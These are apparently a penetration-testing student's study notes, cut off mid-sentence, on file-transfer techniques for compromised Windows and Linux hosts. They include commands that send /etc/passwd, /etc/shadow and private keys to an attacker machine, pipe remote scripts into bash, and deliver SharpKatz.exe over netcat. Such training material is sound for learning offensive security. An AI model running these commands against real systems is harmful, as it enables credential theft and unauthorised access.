Previously, it's been discussed that companies usually allow outbound traf using `HTTP` (`TCP/80`) and `HTTPS` (`TCP/443`) protocols. Commonly enterprises don't allow the `SMB` protocol (`TCP/445`) out of their internal network b/c this can open them up to potential atks. For more info, read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB o/ HTTP w `WebDav.WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918), which is an extension of HTTP, the internet protocol that web browsers and web servers use to comm w each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When using `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share avail, it will try to connect using HTTP. The following Wireshark capture attempts to connect to the file share `testing3`, and b/c it didn't find anything w `SMB`, it uses `HTTP`.![[Pasted image 20240528141512.png]]
#### Configuring WebDav Server
To set up a WebDav server, install two Python modules, `wsgidav` and `cheroot` (more about this implementation can be found [here](https://github.com/mar10/wsgidav)). After installing them, run the `wsgidav` app in the target dir.
```installing-webdav-python-modules
$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```
```using-the-webdav-python-module
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```
```connecting-to-webdav-share
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```
> [!Important Note]
> `DavWWWRoot` is a special keywork recognized by the Windows Shell. No such folder exists on you WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. e.g: \192.168.49.128\sharefolder
```uploading-files-using-smb
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
> [!Impotant Note]
> If there are no `SMB` (`TCP/445`) restrictions, you can use impacket-smbserver the same way it was set up for download operations.
### FTP Uploads
Uploading files using FTP is very similar to downloading files, by using PowerShell or the FTP client to complete the operation. Before starting your FTP Server using the Python module `pyftpdlib`, specify the `--write` option to allow clients to upload files to the atk host.
```shell-session
$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
Now to use PowerShell upload function to upload a file to the FTP Server.
```powershell-upload-file
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
```create-cmd-file
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
### Recap
Several methods were discussed in the section for downloading and uploading files using Windows native tools, but there's more. The following sections, will discuss other mechanisms and tools needed to perform file transfer operations.
## Linux File Transfer Methods
Story:
	A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability and used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.
	The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.
	[Source](https://academy.hackthebox.com/module/24/section/514)
Although Linux can comm via FTP, SMB (like Windows), most malware on all diff OSs uses `HTTP` and `HTTPS` for comms.

This section will review multiple ways to transfer files on Linux, including `HTTP`, `Bash`, `SSH`, etc.

### Download Operations
Supposed you have access to the machine `NIX04`, and you need to download a file from your atk machine. This can be accomplished using the following file download methods.![[Pasted image 20240529165538.png]]
#### Base64 Encoding/Decoding
Depending on the file size the needs transferring, it's possible to use a method that does not req net comms. Just like with Windows download ops, as long as a terminal is accessible, you can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. This can be accomplished w Bash:
```check-file-md5-hash
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
```encode-ssh-key-to-base64
$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```
Then `cat` is used to print the file content, and base64 to encode the output using a pipe (`|`). The `-w 0` option turns off word wrapping and creates a one line output. The whole thing is ended with `;echo` to start a new line to make it easier to copy. This is then copied and pasted into the target Linux machine and `base64` is used w the `-d` option to decode it to a file w `> id_rsa`
```decode-the-file
$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```
Finally, confirm if the file transferred successfully using the `md5sum` command:
```confirm-hash
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
Note: This can also be used to upload files using the reverse operation from the compromised target by using cat and base64 to encode a file and decode it in the atk machine.
### Web Downloads w Wget and cURL
Two of the most common utils in Linux distros to interact w web app are `wget` and `curl`, which are installed on many Linux distros by default.

To download a file using `wget`, specify the URL and the option `-O` to set the output filename.
`$ wget https://<target>.com/path/to/file -O /path/to/output/<filename>`
`cURL` is very similar to `wget`, except the output filename option is lowercase `-o`.
`$ curl -o /path/to/output/<filename> https://<target>.com/path/to/file`
### Fileless Attacks Using Linux
Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools used in Linux can be used to replicate fileless operations, i.e. it's not necessary to download a file to execute it.
> [!Important Note]
> Some payloads, such as `mkfifo`, write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the chosen payload it may create temporary files on the OS.

Taking the `cURL` cmd, instead of downloading LinEnum.sh, execute it directly using a pipe:
`$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
It is also possible to download a Python script file from a web server and pipe it into the Python binary. The following cmd uses `wget` to accomplish this:
`$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
This will return the output `Hello World!`
### Download w Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are avail. As long as Bash v2.04 or greater is installed (compiled w `--enable-net-redirections`), the built-in /dev/TCP device file can be used for simple file downloads:
#### Connect to the Target Webserver
`$ exec 3<>/dev/tcp/10.10.10.32/80`
#### HTTP GET Request
`$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
#### Print the Response
`$ cat <&3`
### SSH Downloads
`SSH` (or Secure Shell) is a protocol that allows secure access to remote computers. `SSH` implementation comes w an `SCP` util for remote file transfer that, by default, uses the `SSH` protocol.

`SCP` (Secure CoPy) is a cmd-line util that allows users to copy files and dir's b/w two hosts securely, which can also be used to copy files from local to remote servers and from remote servers to local machines.

`SCP` is very similar to `cp` (`copy`), but instead of providing a local path, a username, the remote IP addr (or DNS name), and the user's creds are specified.

Use the following cmds to set up an `SSH` server in your attack machine:
```enable-ssh-server
$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...

$ sudo systemctl start ssh # starts ssh server

$ netstat -lnpt # check ssh listening port

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```
Now transfer files by specifying the IP addr, username, and passwd of your atk machine. *Note: you can also create a temp user acct for file transfers and avoid using your primary creds or keys on a remote comp.*
`$ scp <username>@<ip-addr>:/path/to/file.txt .`
The `.` at the end of the line tells `scp` where to copy the file.
### Upload Operations
There are also situations (e.g. binary exploitation and pkt capture analysis) where you must upload files from the target machine onto your atk host. The methods used for downloads will also work for uploads.
#### Web Upload
As mentioned in the `Windows File Transfer Methods` section, [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, can be used, and includes a file upload page. For this Linux example, configure the `uploadserver` module as follows to use `HTTPS` for secure comms. Start by installing the `uploadserver` module:
```download-uploadserver-module
$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
Then, create a certificate. This example shows how to create a self-signed cert.
```create-self-signed-cert
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```
The webserver should not host the cert. It is highly recommended that a new dir is created to host the file for the webserver.
```start-webserver
$ mkdir https && cd https

$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```
Now from the compromised machine, upload the `/etc/passwd` and the `/etc/shadow` files.
`$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
The `--insecure` option is used here b/c the self-signed cert is the one you should trust o/ anyone else's.
### Alternative Web File Transfer Method
Since Linux distros usually have `Python` or `php` installed, starting a webserver to transfer files is straightforward. Also, if the compromised server is a webserver, desired files can be moved to the webserver dir and accessed from the web page (i.e. download the file from the atk host).

It is possible to stand up a webserver using various langs. A compromised Linux machine may not have a webserver installed. In such cases, use a mini webserver. What they lack in sec, they make up for w flexibility, as the webroot location and listening ports can quickly be changed.
```creating-webserver-w-python3
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```creating-webserver-w-python2-7
$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```creating-webserver-w-php
$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```
```creating-webserver-w-ruby
[!bash!]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```
```download-from-target-to-attack-host
$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```
*Note: When starting a new webserver using Python or PHP, it's important to consider that inbound traffic may be blocked. A file is being transferred from the target onto the attack host, but the file is **not** being uploaded.*
### SCP Upload
It can be seen that some companies allow the `SSH protocol` (`TCP/22`) for outbound connections, and in those cases, using an `SSH` server w the `SCP` util to upload files is perfectly valid. This can be accomplished w the following cmd:
```file-upload-using-scp
$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd
```
*Remember: `scp` syntax is similar to `cp` or `copy`.*
### Onward
These are the most common file transfer methods using built-in tools on Linux sys's, but there's many more. The following sections will discuss other mechanisms and tools that can be used to perform file transfer ops.
## Transferring Files with Code
It's common to find diff proglangs installed on target machines, e.g. `Python`, `PHP`, `Perl`, and `Ruby` are commonly avail on Linux, and `cscript` and `mshta` can be used on Windows to execute `JavaScript` or `VBScript` code. 

According to Wikipedia, there are around [700 proglangs](https://en.wikipedia.org/wiki/List_of_programming_languages), and code can be created in any proglang to download, upload, or execute instructions of the target OS. This section will provide examples using common proglangs.
### Python
Python is a popular proglang. Currently, v3 is supported, but it's not uncommon to find servers where Python v2.7 still exists. `Python` can run one-liners from an OS cmd line using the option `-c`.
`$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

`$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
### PHP
`PHP` is also v prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), `PHP` is used by 77.4% of all websites w a known server-side proglang. Although the info is not precise, and the num may be slightly lower, it's common to encounter web servers that use `PHP` when performing an offsec op.

The following example shows the use of the `PHP`'s [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download content from a website combine w the [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save the file into a dir. `PHP` can be used to run one-liners from an OS cmd line using the `-r` option.
#### PHP Download w file_get_contents()
`$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
#### PHP Download w fopen()
An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php), which can be used to open a URL, read its content and save it into a file:
`$ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
#### PHP Download a File and Pipe it to Bash
It's also possible to send the download content to a pipe instead, similar to the fileless example shown in the previous `cURL` and `wget` sections.
`$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
*Note: The URL can be used as a filename w the `@file` function if the `fopen` wrappers have been enabled.*
### Other Languages
`Ruby` and `Perl` are the other popular proglangs that can be used to transfer files. These two proglangs also support running one-liner from an OS cmd line using the option `-e`.
`$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

`$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
### JavaScript
`JavaScript` is a scripting or proglang that allows implementing complex features on web pages. Like w other proglangs, it can be used for many diff things.

The following JavaScript is based on [this post](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) and can be used to download a file. Create a file called `wget.js` and save the following content:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### Download a File Using JavaScript and cscript.exe
The following cmd shows how to use Windows cmd.exe or PowerShell terminal to execute JavaScript code and download a file.
`C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`
### VBScript
[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting lang dev'd by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Win98.

The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). Create a file called `wget.vbs` and save the following content:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
#### Download a File Using VBScript and cscript.exe
The following cmd shows how to use Windows cmd.exe or PowerShell terminal to execute VBScript code and download a file.
`C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`
### Upload Operations using Python3
To upload a file, it's important to understand the functions in a particular proglang to perform the upload op. The Python3 [request module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. The following code is used to upload a file to a Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).
```start-python-uploadserver-module
$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```upload-file-w-python-one-liner
$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
The following divides this one-liner into multiple lined to understand each piece better:
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
This can be done w any other proglang. A good practice is picking one and trying to build an upload program.
### Recap
Understanding how to code to download and upload files may help to achieve goals during a red teaming exercise, a pentest, a CTF competition, and incident response exercise, a forensic investigation, or even in day-to-day sysadmin work.
## Miscellaneous File Transfer Methods
This chapter has covered various file transfer methods for Windows and Linux as well as ways to achieve the same goal using diff proglangs, but there still many more methods and app that can be used.

This section will cover alternative methods, such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/), and using RDP and PowerShell sessions.
### Netcat
[Netcat](https://sectools.org/tool/netcat/) (abbr to `nc`) is a comp networking util for reading from and writing to network connections using TCP or UDP, which means that it can be used for file transfer ops.

The original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

This section will use both the original Netcat and the modern Ncat.
*Note: **Ncat** is used in HtB's Pwnbox as `nc`, `ncat`, and `netcat`.*
### File Transfer with Netcat and Ncat
The target or atk machine can be used to initiate the connection, which is helpful if a fw prevents access to the target.

This example will show two methods to transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from the Pwnbox atk machine onto the compromised target machine. 
#### Method One
Starting with Netcat (`nc`) on the compromised machine, listening w option `-l`, selecting the port to listen w the option `-p <port-num>`, and redirecting the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) using a single greater-than sign (`>`) followed by the filename, `SharpKatz.exe`:
```on-compromised-machine
$ # Example using Original Netcat, listening on port 8000
$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using `Ncat`, it's important to specify `--recv-only` to close the connection once the file transfer is finished:
```on-compromised-machine
$ # Example using Ncat, listening on port 8000
$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
From the atk host, connect to the compromised machine on port 8000 using Netcat and send the [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)file as input to Natcat. The option `-q 0` will tell Netcat to close the connection once it finishes:
```send-file-from-atk-host-to-compromised-machine
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
$ # Example using Original Netcat
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
Bu utilizing Ncat on the atk host, the `--send-only` flag can be used rather than `-q`, which, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, w `--send-only`, there is no need to anticipate further incoming info.
```file-from-atk-to-compromised
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
$ # Example using Ncat
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
Instead of listening on the compromised machine, it's possible to connect to a port on the atk host to perform the file transfer op. This method is useful in scenarios where there's a fw blocking inbound connections. The following listens on port 443 on the atk host and sends the [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.
`$ sudo nc -l -p 443 -q 0 < SharpKatz.exe`
And then use the following cmd on the compromised machine to connect to Netcat to receive the file
`$ nc <atk-host-ip-addr> 443 > SharpKatz.exe`
And now with Ncat:
`$ sudo ncat -l -p 443 --send-only < SharpKatz.exe`
`$ ncat <atk-host-ip-addr> 443 --recv-only > SharpKatz.exe`
If Netcat or Ncat are not installed on the compromised machine, Bash supports read/write